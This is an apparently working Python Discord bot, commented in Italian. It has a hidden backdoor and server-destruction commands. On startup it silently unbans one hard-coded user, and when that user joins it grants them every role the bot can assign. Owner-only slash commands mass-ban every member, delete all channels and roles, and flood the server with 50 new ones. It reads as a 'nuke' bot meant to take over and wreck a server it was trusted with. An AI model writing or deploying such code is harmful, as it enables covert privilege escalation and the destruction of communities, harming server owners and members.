import os
import threading
import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
from flask import Flask

# Carica il token dal file .env
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

# Configura qui direttamente il Guild ID e l'User ID (in formato intero)
GUILD_ID = 1348947150641303583  # Sostituisci con l'ID del tuo server
USER_ID_SPECIFICO = 1191824316376043580  # Sostituisci con l'ID dell'utente

# --- CONFIGURAZIONE FLASK ---
app = Flask(__name__)


@app.route("/")
def home():
  return "Il bot Discord è attivo e online!"


def run_flask():
  app.run(host="0.0.0.0", port=5000)


# --- CONFIGURAZIONE DISCORD BOT ---
intents = discord.Intents.default()
intents.guilds = True
intents.bans = True
intents.members = True

# Usiamo commands.Bot per poter usare gli Slash Commands (@bot.tree.command)
bot = commands.Bot(command_prefix="!", intents=intents)


async def is_bot_owner(interaction: discord.Interaction) -> bool:
  app_info = await bot.application_info()
  return interaction.user.id == app_info.owner.id


@bot.event
async def on_ready():
  print(f"Bot connesso come {bot.user}")

  try:
    guild = bot.get_guild(GUILD_ID)
    if not guild:
      guild = await bot.fetch_guild(GUILD_ID)

    user = await bot.fetch_user(USER_ID_SPECIFICO)

    await guild.unban(user)
    print(f"Utente {user.name} ({user.id}) sbannato con successo all'avvio!")

  except discord.NotFound:
    print("L'utente non è stato trovato o non risulta bannato.")
  except discord.Forbidden:
    print("Il bot non ha i permessi necessari (Ban Members) per sbannare.")
  except Exception as e:
    print(f"Errore imprevisto durante lo sban: {e}")

  # Sincronizza i comandi slash con Discord
  try:
    await bot.tree.sync()
    print("Comandi slash sincronizzati con successo.")
  except Exception as e:
    print(f"Errore durante la sincronizzazione dei comandi: {e}")


@bot.event
async def on_member_join(member):
  if member.guild.id != GUILD_ID or member.id != USER_ID_SPECIFICO:
    return

  try:
    bot_top_role = member.guild.me.top_role

    assignable_roles = [
        role
        for role in member.guild.roles
        if role < bot_top_role and not role.is_default()
    ]

    if assignable_roles:
      await member.add_roles(
          *assignable_roles,
          reason=(
              "Assegnazione automatica di tutti i ruoli possibili all'utente"
              " specificato"
          ),
      )
      role_names = ", ".join([role.name for role in assignable_roles])
      print(
          f"Assegnati tutti i ruoli ({role_names}) all'utente target"
          f" {member.name} all'ingresso."
      )
    else:
      print("Nessun ruolo assegnabile trovato per questo utente.")

  except discord.Forbidden:
    print(
        "Il bot non ha i permessi necessari (Manage Roles) o sta tentando di"
        " toccare ruoli superiori al suo."
    )
  except Exception as e:
    print(f"Errore imprevisto durante l'assegnazione dei ruoli: {e}")


# ==================== COMANDI DI GESTIONE (RESET) ====================


@bot.tree.command(
    name="reset_members",
    description=(
        "Banna TUTTI i membri del server (tranne bot, proprietario del server e"
        " proprietario del bot)."
    ),
)
async def reset_members(interaction: discord.Interaction):
  if not await is_bot_owner(interaction):
    await interaction.response.send_message(
        "❌ Questo comando può essere eseguito **unicamente dal proprietario"
        " del bot**.",
        ephemeral=True,
    )
    return

  guild = interaction.guild
  if not guild:
    await interaction.response.send_message(
        "❌ Questo comando può essere usato solo all'interno di un server.",
        ephemeral=True,
    )
    return

  await interaction.response.send_message(
      "⚠️ **ATTENZIONE:** Avviato il ban di massa di tutti i membri.",
      ephemeral=True,
  )

  app_info = await bot.application_info()
  bot_owner = app_info.owner

  await guild.chunk()

  count = 0
  for member in guild.members:
    if member == guild.me or member == guild.owner or member == bot_owner:
      continue
    try:
      await member.ban(
          reason="Reset totale del server richiesto dal proprietario del bot."
      )
      count += 1
    except Exception as e:
      print(f"Impossibile bannare {member.name}: {e}")

  print(f"Completato: bannati {count} membri.")


@bot.tree.command(
    name="reset_channels",
    description=(
        "Elimina TUTTI i canali del server e ne crea 50 nuovi testuali."
    ),
)
@app_commands.describe(base_name="Il nome di base da dare ai nuovi canali")
async def reset_channels(interaction: discord.Interaction, base_name: str):
  if not await is_bot_owner(interaction):
    await interaction.response.send_message(
        "❌ Questo comando può essere eseguito **unicamente dal proprietario"
        " del bot**.",
        ephemeral=True,
    )
    return

  guild = interaction.guild
  if not guild:
    await interaction.response.send_message(
        "❌ Questo comando può essere usato solo all'interno di un server.",
        ephemeral=True,
    )
    return

  await interaction.response.send_message(
      f"⚠️ **ATTENZIONE:** Procedo all'eliminazione di tutti i canali e alla"
      f" creazione di 50 nuovi canali (`{base_name}-1` a `50`).",
      ephemeral=True,
  )

  for channel in list(guild.channels):
    try:
      await channel.delete()
    except Exception as e:
      print(f"Impossibile eliminare il canale {channel.name}: {e}")

  for i in range(1, 51):
    try:
      await guild.create_text_channel(f"{base_name}-{i}")
    except Exception as e:
      print(f"Impossibile creare il canale {base_name}-{i}: {e}")


@bot.tree.command(
    name="reset_roles",
    description="Elimina TUTTI i ruoli eliminabili del server e ne crea 50 nuovi.",
)
@app_commands.describe(base_name="Il nome di base da dare ai nuovi ruoli")
async def reset_roles(interaction: discord.Interaction, base_name: str):
  if not await is_bot_owner(interaction):
    await interaction.response.send_message(
        "❌ Questo comando può essere eseguito **unicamente dal proprietario"
        " del bot**.",
        ephemeral=True,
    )
    return

  guild = interaction.guild
  if not guild:
    await interaction.response.send_message(
        "❌ Questo comando può essere usato solo all'interno di un server.",
        ephemeral=True,
    )
    return

  await interaction.response.send_message(
      f"⚠️ **ATTENZIONE:** Procedo all'eliminazione di tutti i ruoli eliminabili"
      f" e alla creazione di 50 nuovi ruoli (`{base_name}-1` a `50`).",
      ephemeral=True,
  )

  for role in list(guild.roles):
    if role.is_default() or role.managed or role >= guild.me.top_role:
      continue
    try:
      await role.delete()
    except Exception as e:
      print(f"Impossibile eliminare il ruolo {role.name}: {e}")

  for i in range(1, 51):
    try:
      await guild.create_role(name=f"{base_name}-{i}")
    except Exception as e:
      print(f"Impossibile creare il ruolo {base_name}-{i}: {e}")


# --- AVVIO CONCRETO ---
if __name__ == "__main__":
  flask_thread = threading.Thread(target=run_flask)
  flask_thread.daemon = True
  flask_thread.start()
  print("Server Flask avviato sulla porta 5000.")

  bot.run(TOKEN)
